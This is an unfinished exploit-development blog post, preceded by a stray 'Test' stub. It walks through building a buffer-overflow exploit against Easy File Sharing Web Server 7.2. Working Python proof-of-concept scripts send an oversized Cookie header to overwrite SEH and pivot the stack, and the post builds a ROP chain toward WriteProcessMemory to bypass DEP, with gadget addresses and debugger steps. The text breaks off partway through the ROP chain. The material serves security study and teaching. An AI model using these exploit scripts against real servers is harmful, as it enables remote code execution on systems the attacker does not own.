---
title:  "Test"
date:   2020-07-12
tags: [posts]
excerpt: "Test"
---
Introduction
---
---
title:  "(UNDER CONSTRUCTION) Exploit Development: Playing ROP'em COP'em Robots with WriteProcessMemory()"
date:   2020-07-11
tags: [posts]
excerpt: "Gaining code execution with `WriteProcessMemory()` via ROP and outlining the occasional need for Call-Oriented Programming."
---
Introduction
---
The other day on Twitter, I received a very kind and flattering [message](https://twitter.com/duff22b/status/1282014844338597888?s=20) about a previous [post](https://connormcgarr.github.io/ROP/) of mine on the topic of ROP. Thinking about this post, I recall utilizing `VirtualProtect()` and disabling ASLR system wide to bypass DEP. I also used an outdated debugger, Immunity Debugger at the time, and I wanted to expand on my previous work, with a little bit of a less documented ROP technique and WinDbg.

Why is ROP Important?
---
ROP/COP and other code reuse apparatuses are very important mitigation bypass techniques, due to their versatility. Binary exploit mitigations have come a long way since DEP. Notably, mitigations such as CFG, upcoming XFG, ACG, etc. have posed an increased threat to exploit writers as time has gone on. ROP _still_ has been the “swiss army knife” to keep binary exploits alive. ROP can result in arbitrary write and arbitrary read primitives- as we will see in the upcoming post. Additionally, data only attacks with the implementation of ACG have become crucial. It is possible to perform a data only attack, although expensive from a technical perspective, to write payloads fully in ROP.

What This Blog Assumes and What This Blog _ISN'T_
---
If you are interested in a remote bypass of ASLR and a 64-bit version of bypassing DEP, I suggest reading a [previous blog](https://connormcgarr.github.io/eko2019-exe) of mine on this topic (although, undoubtedly, there are better blogs on this subject).

This blog will not address ASLR or 64-bit exploitation- and will be utilizing non-ASLR compiled modules, as well as the x86 [`__stdcall`](https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=vs-2019) calling convention (technically an "ASLR bypass", but in my opinion only information leak = a _true_ ASLR bypass).

Why are these topics not being addressed? This post aims to focus on a different, less documented approach to executing code with ROP. As such, I find it useful to use the most basic, straightforward example to hopefully help the reader fully understand a concept. I am _fully_ aware that it is 2020 and I am well aware mitigations such as CFG are more common. However, _generally_ the last step in exploitation, no matter HOW many mitigations there are (unless you are performing a data only attack), is bypassing DEP (in user mode or kernel mode). This post aims to address the latter portion of the last sentiment- and expects the reader already has an ASLR bypass primitive and a way to pivot to the stack.

Expediting The Process
---
The application we will be going after is `Easy File Sharing Web Server 7.2`, which has a memory corruption vulnerability as a result of an HTTP request.

The offset to SEH is `2563` bytes. Instead of using a `pop <reg>` `pop <reg>` `ret` sequence, as is normally done on a 32-bit SEH exploit, an `add esp, <bytes>` instruction is used. This will take the stack, where it is currently not controlled by us, and change the address to an address on the stack that we control- and then return into it.

```python
import sys
import os
import socket
import struct

# 4063 byte SEH offset
# Stack pivot lands at padding buffer to SEH at offset 2563
crash = "\x90" * 2563

# Stack pivot lands here
# Beginning ROP chain
crash += struct.pack('<L', 0x90909090)

# 4063 total offset to SEH
crash += "\x41" * (4063-len(crash))

# SEH only- no nSEH because of DEP
# Stack pivot to return to buffer
crash += struct.pack('<L', 0x10022869)		# add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

# 5000 total bytes for crash
crash += "\x41" * (5000-len(crash))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = "GET /changeuser.ghp HTTP/1.1\r\n"
http_request += "Host: 172.16.55.140\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Referer: http://172.16.55.140/\r\n"
http_request += "Cookie: SESSIONID=9349; UserID=" + crash + "; PassWD=;\r\n"
http_request += "Connection: Close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.130", 80))
s.send(http_request)
s.close()
```

Set a breakpoint on the stack pivot of `add esp, 0x1004 ; ret` with the WinDbg command `bp 0x10022869`. After sending the exploit PoC- we will need to view the contents of the exception handler with the WinDbg command `!exchain`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM0.png" alt="">

As a breakpoint has already been set on the address inside of SEH, all that is needed to pass the exception is resuming execution with the `g` command in WinDbg. The breakpoint is hit, and we will step through the instruction of `add esp, 0x1004` (`t` in WinDbg) to take control of the stack.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM1.png" alt="">

As a point of contention, we have about 980 bytes to work with.

The Call to `WriteProcessMemory()`
---
What is the goal of this method of bypassing DEP? The goal here is to not to dynamically change permissions of memory to make it executable- but to instead write our shellcode, dynamically, to already executable memory. 

As we know, when DEP is enabled, memory is either writable or executable- but not both at the same time. The previous sentiment about writing shellcode, via `WriteProcessMemory()`, to executable memory is a bit contradictory knowing this. If memory is executable, adhering to DEP's rules, it _shouldn't_ be writable. `WriteProcessMemory()` overcomes this by temporarily marking memory pages as `RWX` while data is being written to a destination- even if that destination doesn't have writable permissions. After the write succeeds, the memory is then marked again as execute only.

From an adversary's perspective, this means something. Certain shellcodes employ encoding mechanisms to bypass character filtering. If this is the case, encoded shellcode which is dynamically written to execute only memory will fail when executed. This is due to the encoded shellcode needing to "write itself" over adjacent process memory to decode. Since pages are execute only, and we do not have the `WriteProcessMemory()` "pass" to write to execute only memory anymore, an access violation will occur. Something to definitely keep in mind.

Let's take a look at the call to `WriteProcessMemory()` firslty, to help make sense of all of this (per [Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory))

```c++
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

Let's break down the call to `WriteProcessMemory()` by taking a look at each function argument.

1. `HANDLE hProcess`: According to Microsoft Docs, this parameter is a handle to the desired process in which a user wants to write to the process memory. A handle, without going too much into detail, is a "reference" or "index" to an object. Generally, a handle is used as a "proxy" of sorts to access an object (this is especially true in kernel mode, as user mode cannot directly access kernel mode objects). We will look at how to dynamically resolve this parameter with relative ease. Think of this as "don't talk to me, talk to my assistant", where the process is the "me" and the handle is the "assistant".
2. `LPVOID lpBaseAddress`: This parameter is a pointer to the base address in which a write is desired. For example, if the region of memory you would like to write to was `0x11223344` - `0x11223355`, the argument passed to the function call would be `0x11223344`.
3. `LPCVOID lpBuffer`: This is a pointer to the buffer that is to be written to the address specified by the `lpBaseAddress` parameter. This will be the pointer to our shellcode.
4. `SIZE_T nSize`: The number of bytes to be written (whatever the size of the shellcode + NOPs, if necessary, will be).
5. `SIZE_T *lpNumberOfBytesWritten`: This parameter, similarly to the `VirtualProtect()` parameter `lpflOldProtect` which inherits the old permissions of modified memory, inherits the number of bytes written. This will need to be a memory address, within the process space, that is writable.

Preserving a Stack Address
---
One of the pitfalls of ROP is that stack control is absolutely vital. Why? It is logical actually- each ROP gadget is appended with a `ret` instruction. `ret`, from a technical perspective, will take the value pointed to by RSP (or ESP in this case), which will be the next ROP gadget on the stack and load it into RIP (EIP in this case). Since ROP must be performed on the stack, and due to the dynamic nature of the stack, the virtual memory addresses associated with the stack are also dynamic.

As seen below, when the stack pivot is successfully performed, the virtual address of the stack is `0x029a68dc`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM1.png" alt="">

Restarting the application and pivoting to the stack again, the virtual address of the stack is at `0x028068dc`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM3.png" alt="">

At first glance, this puts us in a difficult position. Even with knowledge of the base addresses of each module, and their static nature- the stack still seems to change! Although the stack is dynamically being resolved to seemingly "random" and "volatile to the duration of the process" memory- there is a way around this. If we can use a ROP gadget, or set of gadgets, properly- we can dynamically store an address around the stack into a CPU register.

Let's start our ROP chain by preserving an address near the current stack pointer.

As you may or may not know, the base pointer (EBP) points to the "bottom" of the current stack frame (we will refer to the current stack frame as "the stack"). This means that EBP should be relatively close to ESP. We can validate this in WinDbg by viewing the current state of the CPU registers after the stack pivot.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM4.png" alt="">

After parsing the PE with [rp++](https://github.com/0vercl0k/rp), to enumerate a list of ROP gadgets (you can view how to use rp++ by taking a look at my last ROP blog [post](https://connormcgarr.github.io/ROP))- a nice gadget resides in `sqlite3.dll` that can help us preserve the address of EBP into another "common" register, which has more useful ROP gadgets as we will see later on, such as EAX.

```
0x61c05e8c: xchg eax, ebp ; ret  ;  (1 found)
```

Replace the NOPs in the previous PoC script, under the "Begin ROP chain" comment, with the above address. After firing off the updated PoC, we land on our intended ROP gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM5.png" alt="">

After executing the above gadget, EAX is now loaded with an address near the current stack.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM6.png" alt="">

Notice that EBP has also been set to 0, due to the ROP gadget. This will come into play shortly.

Although EAX is _relatively_ close to ESP- it is still a decent ways away. Currently, EAX (which now contains the old value of EBP) is `0xfec` bytes away from ESP.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM7a.png" alt="">

To compensate for this, we will manipulate EAX to contain the address at ESP + 0x38.

Why ESP + 0x38 instead of just ESP you ask? This is a "preparatory" procedure (manipulating EAX to contain the address of ESP + 0x38). 

As we will see later on, we would like to preserve an address around ESP into another "common" register, ECX. ECX is a register that is used as a "counter" (although technically it is a general purpose register). This means that ECX generally is a part of some more useful ROP gadgets. 

In order to do this, the stack will eventually need to be increased by 0x24 bytes to get the value (technically future value) of ESP into ECX, due to the nature of the ROP gadgets available within the process memory. A ROP gadget will inadvertently perform an `add esp, 0x24`, resulting in collateral damage to get what we need accompilshed, accomplished. There will be 4 ROP gadgets (plus an additional DWORD that will be "popped" into a register), for a total of 0x14 (20 decimal) bytes, that will need to be executed between now and when that `add esp, 0x24` gadget is executed (0x38 - 0x24 = 0x14).

This is reason why we will set EAX to the value of ESP + 0x38 instead of ESP + 0x24, because we will need 0x14 bytes worth of ROP gadgets between then and now. By the time the ROP gadgets _before_ the `add esp, 0x24` instruction are executed, the value in EAX will be ESP + 0x24. However, if we loaded ESP + 0x24 into EAX now, then by the time we reach the `add esp, 0x24` instruction, EAX will contain a value of ESP + 0x10.

Knowing this, and knowing that we would like EAX and ECX to be equal to the current value of ESP _after_ the ESP + 0x38 stack manipulation occurs- we will prepare EAX in advance.

> Note that this is by no means a requirement (getting EAX and ECX set to the EXACT value of ESP) when doing ROP. This will just make life easier in the future. If this doesn't make sense now, do not worry. Just focus on the fact we would like to get EAX closer to ESP for the time being.

```
0x10018606: pop ecx ; ret  ;  (1 found)
0xffffefe0 (Value to be popped into EAX. This is the negative representation of the distance between the current value of EAX and ESP + 0x38). 
0x1001283e: sub eax, ecx ; ret  ;  (1 found)
```

After the aformentioned gadget of exchanging EBP and EAX, program execution hits the `pop ecx` gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM8.png" alt="">

The negative value of the distance between EAX and ESP + 0x38 is placed into ECX.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM9a.png" alt="">

Program execution then transfers to the `sub eax, ecx` ROP gadget, which will place the difference into the EAX register.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM10.png" alt="">

This yields our desired result.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM11a.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM12a.png" alt="">

> Note that `0xCCCCCCCC` is denoted as a visual for where we _hope_ our program execution resumes at after all of this craziness. Our goal is for when the last `ret` occurs, it returns into this DWORD.

The goal now is to get the current value of EAX into ECX. There is a nice ROP gadget that will do this for us.

```
0x61c6588d: mov ecx, eax ; mov eax, ecx ; add esp, 0x24 ; pop ebx ; leave  ; ret  ;  (1 found)
```

This gadget will take EAX and place it into ECX. Then, a `mov eax, ecx` instruction will occur- which is meaningless because ECX and EAX already contain the same value- meaning this part of the gadget basically just serves as a "NOP" of sorts. ESP then gets raised by 0x24 bytes, which we can compensate for- so this isn't an issue. `pop ebx` can be compensated for as well, but `leave` will be a problem as this will directly manipulate ESP, throwing our ROP execution flow off.

`leave`, from a technical perspective, will perform a `mov esp, ebp` and a `pop ebp` instruction.

`mov esp, ebp` will place EBP into ESP. Let's think about how we can leverage this.

We know that currently EAX contains our target address. We also can recall from earlier that EBP is currently set to 0. If we could place EAX into EBP _BEFORE_ the `leave` instruction executes- it would set ESP to ESP + 0x24 (at the time of the instruciton executing) because of the `mov esp, ebp` instruction- which sets ESP to whatever EBP is. Due to the `add esp, 0x24` gadget that occurs before the `leave` instruction- this would actually end up setting ESP to ESP, which is what we want. The goal here is to restore ESP back to our controlled data, which consists of our ROP gadgets.

It is a bit of a moutful and "mind bender" of sorts- so do not worry if it is hazy or confusing at the moment. Viewing this step by step in the debugger will help make sense of all of this.

> Note, after each gadget- obviously the value of ESP changes. For completness sake, until we hit the `add esp, 0x24` gadget- we will refer to the "target" ESP + 0x38 address as ESP + 0x38 (even though the offset will technically shrink after each gadget is executed).

First, as mentioned above, we need to get the value in EAX into EBP to prepare for the `leave` instruction.

```
0x61c30547: add ebp, eax ; ret  ;  (1 found)
```

How does adding EAX to EBP place EAX into EBP? Recall that EBP is set to 0 and EAX contains the memory address of ESP + 0x38. That address of ESP + 0x38 will get added to the number 0, which doesn't alter it in any way, and the result of the addition is placed into EBP- essentially "moving" the address into EBP.

Let's step through all of this in WinDbg- to make things  a bit more clear.

First, program execution reaches the `add ebp, eax` instruction.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM12.png" alt="">

EBP currently is set to 0 and EAX is set to ESP + 0x38

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM13a.png" alt="">

Stepping through the instruction yields the desired result of placing ESP + 0x38 into EBP.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM14aa.png" alt="">

After EBP is prepared, program execution reaches the next ROP gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM15.png" alt="">

After stepping through the `mov ecx, eax` gadget- ECX and EAX are now both set to ESP + 0x38.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM16a.png" alt="">

Stepping through the `mov eax, ecx` instruction doesn't affect the EAX or ECX registers at all, as ECX (which is already equal to EAX) is placed into EAX.

Taking a look on the stack now, we can see our compensation for `add esp, 0x24` and `pop ebx` between the address before `0xCCCCCCCC`

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM17aa.png" alt="">

Program executing has also reached the `add esp, 0x24` instruction.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM18a.png" alt="">

Stepping through the instruction, the stack as been set to the same values in EAX, ECX, and EBP.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM19a.png" alt="">

Then, `pop ebx` clears the last bit of "padding" on the stack.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM20.png" alt="">

After all of this has occured, the `leave` instruction is loaded up for execution.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM19.png" alt="">

`leave, ret` is executed, and the execution of our ROP chain resumes its course- all while preserving ESP into ECX and EAX!

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM21.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM22.png" alt="">

WriteProcessMemory() Parameters
---

Recall that we are dealing with the x86 architecture, meaning function calls go through `__stdcall` instead of `__fastcall`. This means that instead of placing our function arguments into RCX, RDX, R8, R9, RSP + 0x20, and so on- we can just simply place our parameters on the stack, as such.

```python
# kernel32!WriteProcessMemory placeholder parameters
crash += struct.pack('<L', 0x61c832e4)		# Pointer to kernel32!WriteFileImplementation (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
crash += struct.pack('<L', 0x61c72530)		# Return address parameter placeholder (where function will jump to after execution- which is where shellcode will be written to. This is an executable code cave in the .text section of sqlite3.dll)
crash += struct.pack('<L', 0xFFFFFFFF)		# hProccess = handle to current process (Psuedo handle = 0xFFFFFFFF points to current process)
crash += struct.pack('<L', 0x61c72530)		# lpBaseAddress = pointer to where shellcode will be written to. (0x61C72530 is an executable code cade in the .text seciton of sqlite3.dll) 
crash += struct.pack('<L', 0x11111111)		# lpBuffer = base address of shellcode (dynamically generated)
crash += struct.pack('<L', 0x22222222)		# nSize = size of shellcode 
crash += struct.pack('<L', 0x1004D740)		# lpNumberOfBytesWritten = writeable location (.idata section of ImageLoad.dll address in a code cave)
```

Let's talk about where these parameters come from.

To "bypass" Windows' ASLR (the OS DLLs still use ASLR, even if this application doesn't)- we can leverage the Import Address Table (IAT).

Whenever a program calls a Windows API function- it does not do so directly. A special table, within the process space, known as the IAT essentially contains pointers to each needed API function.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM23.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM24.png" alt="">

The IAT for this application is located at the `.exe` base + 0x166000 and it is 0xC40 bytes in size.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM25.png" alt="">

As is seen in the image above, the IAT just contains pointers to Windows API functions. Meaning each of these functions points to a Windows API function.

We have "the base address" of each module (in reality, each module is just not compiled with ASLR)- so that is no problem. However, the value that each of these functions points to (which is a Windows API function) will change upon reboot.

The way to get around this, would be to load one of these IAT entries into a register we control (such as ECX) and then peform a `mov ecx, dword ptr [ecx]` instruction.

This would extract whatever ECX points to (which is a Windows API function) and place it into ECX. Even though Windows will randomize the addresses of the API, we can still leverage the fact each IAT _will always_ point to the same Windows API function (even if the address of the API changes) to make sure this is not a problem.

Although the IAT for this application doesn't directly contain a function pointer to `kernel32WriteProcessMemory`- it does contain pointers to other `kernel32.dll` pointers, such as `kernel32!WriteFileImplementation`. We also know that the distance between each function with a DLL DOESN'T CHANGE. This means, the distance between `kernel32!WriteFileImplementation` and `kernel32!WriteProcessMemory` will always remain the same for the current patch level and OS version.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM26.png" alt="">

This gives us a primitive to dynamically resolve the location of `kernel32!WriteProcessMemory`.

```python
crash += struct.pack('<L', 0x61c72530)		# Return address parameter placeholder (where function will jump to after execution- which is where shellcode will be written to. This is an executable code cave in the .text section of sqlite3.dll)
```

The next "parameter" is not really even a parameter at all. Similarily to my last ROP post, this will be used as the address in which program execution will transfer to _AFTER_ the call to `kernel32!WriteProcessMemory` is made. This will also be the same address as our shellcode.

Why `0x61c72530` specifically?

`sqlite3.dll` is a module of the application- meaning it is a part of process memory. Since this DLL is required for the application to work, we can target it as a place to write our shellcode. With this method of ROP, we need to find an executable portion of memory within the application and its modules. Then, using the call to `kernel32!WriteProcessMemory`- we will write our shellcode to this executable portion of memory. Using the command `!dh sqlite3` in WinDbg, we can determing the `.text` section of the portable executable has execute permissions. Also recall that even without write permissions, we can still write our shellcode if we "proxy" the write through the API call.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM27.png" alt="">

Viewing the `.text` section address- we can see that the address chosen is just an executable "code cave" that is not initialized to any memory- meaning that if we corrupt this memory, the program _shouldn't_ care.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM28.png" alt="">

This means, after the function call is completed and our shellcode is written here- program execution will transfer to this address.

```python
crash += struct.pack('<L', 0xFFFFFFFF)		# hProccess = handle to current process (Psuedo handle = 0xFFFFFFFF points to current process)
```

The `handle` parameter is quite easy to fill- we can even use a static value. According to Microsoft Docs, [`GetCurrentProcess()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess) returns a handle to the current process. More specifically, it returns a "psuedo handle" to the current process. A psuedo handle, denoted by -1, or `0xFFFFFFFF`, is "special" constant that refers to a handle to the current process. This means, whenever a Windows API function requests a handle (generally in user mode), passing `0xFFFFFFFF` will tell the API in question to utilize a handle to the current process. Since we would like to write our shellcode to memory within the process space- passing `0xFFFFFFFF` to the `kernel32!WriteProcessMemory` function call will tell the function we would like to write the memory to virtual memory within the current process space.


```python
crash += struct.pack('<L', 0x61c72530)		# lpBaseAddress = pointer to where shellcode will be written to. (0x61C72530 is an executable code cade in the .text seciton of sqlite3.dll) 
```

This will be the address of our shellcode, as already outlined by the "return" parameter.

```python
crash += struct.pack('<L', 0x11111111)		# lpBuffer = base address of shellcode (dynamically generated)
```

This parameter will be a pointer to our shellcode (which will first need to be written to the stack). We will dynamically resolve this with ROP gadgets.

```python
crash += struct.pack('<L', 0x22222222)		# nSize = size of shellcode 
```

This will be the size of our shellcode.

```python
crash += struct.pack('<L', 0x1004D740)		# lpNumberOfBytesWritten = writeable location (.idata section of ImageLoad.dll address in a code cave)
```

Lastly, this will be any writable address.

Let's ROP v2!
---

We will be using what some have dubbed the "pointer" method of ROP (when it comes to x86 at least), where we will place these parameter "placeholders" on the stack and then dynamically change what these parameters point to in order to make a successful function call. Here is the PoC we will be using.

```python
import sys
import os
import socket
import struct

# 4063 byte SEH offset
# Stack pivot lands at padding buffer to SEH at offset 2563
crash = "\x90" * 2563

# Stack pivot lands here
# Beginning ROP chain

# Saving address near ESP for relative calculations into EAX and ECX
# EBP is near stack address
crash += struct.pack('<L', 0x61c05e8c)		# xchg eax, ebp ; ret: sqlite3.dll (non-ASLR enabled module)

# EAX is now 0xfec bytes away from ESP. We want current ESP + 0x28 (to compensate for loading EAX into ECX eventually) into EAX
# Popping negative ESP + 0x28 into ECX and subtracting from EAX
# EAX will now contain a value at ESP + 0x24 (loading ESP + 0x24 into EAX, as this value will be placed in EBP eventually. EBP will then be placed into ESP- which will compensate for ROP gadget which moves EAX into EAX vai "leave")
crash += struct.pack('<L', 0x10018606)		# pop ecx, ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffffefe0)		# Negative ESP + 0x28 offset
crash += struct.pack('<L', 0x1001283e)		# sub eax, ecx ; ret: ImageLoad.dll (non-ASLR enabled module)

# This gadget is to get EBP equal to EAX (which is further down on the stack) - due to the mov eax, ecx ROP gadget that eventually will occur.
# Said ROP gadget has a "leave" instruction, which will load EBP into ESP. This ROP gadget compensates for this gadget to make sure the stack doesn't get corrupted, by just "hopping" down the stack
# EAX and ECX will now equal ESP - 8 - which is good enough in terms of needing EAX and ECX to be "values around the stack"
crash += struct.pack('<L', 0x61c30547)		# add ebp, eax ; ret sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c6588d)		# mov ecx, eax ; mov eax, ecx ; add esp, 0x24 ; pop ebx ; leave ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget (pop ebx)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget (pop ebp in leave instruction)

# Jumping over kernel32!WriteProcessMemory placeholder parameters
crash += struct.pack('<L', 0x10015eb4)		# add esp, 0x1c ; ret: ImageLoad.dll (non-ASLR enabled module)

# kernel32!WriteProcessMemory placeholder parameters
crash += struct.pack('<L', 0x61c832e4)		# Pointer to kernel32!WriteFileImplementation (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
crash += struct.pack('<L', 0x61c72530)		# Return address parameter placeholder (where function will jump to after execution- which is where shellcode will be written to. This is an executable code cave in the .text section of sqlite3.dll)
crash += struct.pack('<L', 0xFFFFFFFF)		# hProccess = handle to current process (Psuedo handle = 0xFFFFFFFF points to current process)
crash += struct.pack('<L', 0x61c72530)		# lpBaseAddress = pointer to where shellcode will be written to. (0x61C72530 is an executable code cade in the .text seciton of sqlite3.dll) 
crash += struct.pack('<L', 0x11111111)		# lpBuffer = base address of shellcode (dynamically generated)
crash += struct.pack('<L', 0x22222222)		# nSize = size of shellcode 
crash += struct.pack('<L', 0x1004D740)		# lpNumberOfBytesWritten = writeable location (.idata section of ImageLoad.dll address in a code cave)

# 4063 total offset to SEH
crash += "\x41" * (4063-len(crash))

# SEH only- no nSEH because of DEP
# Stack pivot to return to buffer
crash += struct.pack('<L', 0x10022869)		# add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

# 5000 total bytes for crash
crash += "\x41" * (5000-len(crash))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = "GET /changeuser.ghp HTTP/1.1\r\n"
http_request += "Host: 172.16.55.140\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Referer: http://172.16.55.140/\r\n"
http_request += "Cookie: SESSIONID=9349; UserID=" + crash + "; PassWD=;\r\n"
http_request += "Connection: Close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.130", 80))
s.send(http_request)
s.close()
```

The above PoC places the parameters on the stack and also performs a "jump" over them with `add esp, 0x1C`. Let's examine this in the debugger.

The following is the state of the stack- with the `kernel32!WriteProcessMemory` parameters outlined in red.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM29.png" alt="">

The address `0x10015eb4` is a ROP gadget that will add to ESP. After this gadget is executed, we can see the stack moves further down.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM30.png" alt="">

We can see that we have moved further into our buffer, where our future ROP gadgets will reside. The parameters for the function call are now "behind" where program execution is- meaning we will not inadvertently corrupt these parameters because they are not within the current execution flow.

Now that this is out of the way- we can "officially" begin our ROP chain to obtain code execution.

lpBuffer
---

The first thing that we will do is get the `lpBuffer` parameter, which will contain the pointer to the base of our shellcode, situated. Recall that `kernel32!WriteProcessMemory` will take in a source buffer and write it somewhere else. Since we have control of the stack, we will just preemptively place our shellcode there. This is where the headache of storing an address near the stack in EAX and ECX will come into play.

As it currently stands, ECX is 0x18 bytes behind the parameter placeholder for `lpBuffer`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM32.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM31.png" alt="">

The goal right now is to increase ECX by 0x18 bytes. Here is the reason for this.

Let's say we get the parameter placeholder's location (e.g. the virtual memory address, not the `0x11111111` itself) in ECX (which we will). If we were to read the value of ECX, we would be reading the value `0x2826930`. However, if we read the value of `dword ptr [ecx]` instead- we would be reading the actual value of `0x11111111`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM33.png" alt="">

The first part of the image above shows the value of the address itself. The second part of the image shows what happens when we "dereference" (using `poi` in WinDbg), or extract the value a memory address is pointing to. We can leverage this, by using an arbitrary write primtive. When we get the address of the `lpBuffer` parameter into ECX- we then will not overwrite ECX, but rather `dword ptr [ecx]`- which will force the address on the stack (which contains the parameter placeholder) to point to a _DIFFERENT_ address, that we control.

Remember- everytime the process is terminated and restarted- the virtual memory on the stack changes. This is why we need to dynamically resolve this parameter, instead of hardcoding an address. test

We will use the following ROP gadgets, in order to make ECX contain the stack address holding the `lpBuffer` parameter placeholder.

```python
# ECX currently points to lpBuffer placeholder parameter location - 0x18
# Moving ECX 8 bytes before EAX, as the gadget to overwrite dword ptr [ecx] overwrites it at an offset of ecx+0x8
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
